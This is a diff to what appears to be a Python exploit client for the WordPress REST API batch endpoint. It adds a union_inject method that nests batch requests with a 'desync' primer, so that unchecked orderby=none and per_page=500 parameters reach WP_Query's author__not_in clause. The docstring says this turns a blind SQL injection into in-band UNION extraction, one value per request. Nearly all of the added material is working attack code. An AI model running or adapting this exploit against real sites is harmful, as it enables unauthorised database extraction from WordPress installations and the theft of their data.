@@ -143,6 +143,43 @@ class BatchClient:
         """Send a payload placing `author_not_in` into the WP_Query author__not_in clause."""
         return self.post(self._payload(author_not_in))
 
+    def union_inject(self, author_not_in: str) -> Response:
+        """Send a payload that lands `author_not_in` in a non-split, no-ORDER-BY WP_Query.
+
+        The source request targets the single-post item route ``/wp/v2/posts/999999``, so it
+        validates against the item schema and the collection-only params ``author_exclude``,
+        ``orderby`` and ``per_page`` pass through unchecked. The inner desync then dispatches it
+        under the posts collection handler, which consumes them:
+
+        - ``orderby=none`` removes the trailing ``ORDER BY {posts}.<col>`` that otherwise makes a
+          ``UNION`` fail with "cannot be used in global ORDER clause";
+        - ``per_page=500`` keeps ``WP_Query`` in full-row (non-split) mode when no persistent object
+          cache is in use, so a ``UNION SELECT`` row survives as a fake ``WP_Post``.
+
+        Together these turn the blind sink into in-band UNION extraction (one request per value).
+        """
+        return self.post(self._union_payload(author_not_in))
+
+    @staticmethod
+    def _union_payload(author_not_in: str) -> dict:
+        query = urllib.parse.urlencode(
+            {"author_exclude": author_not_in, "orderby": "none", "per_page": "500"}
+        )
+        inner = {
+            "requests": [
+                _DESYNC_PRIMER,
+                {"method": "GET", "path": "/wp/v2/posts/999999?" + query},
+                {"method": "GET", "path": "/wp/v2/posts"},
+            ]
+        }
+        return {
+            "requests": [
+                _DESYNC_PRIMER,
+                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
+                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
+            ]
+        }
+
     def rows(self, response: Response) -> Optional[list]:
         """Return the inner get_items() result rows from a nested batch response, else None."""
         try:
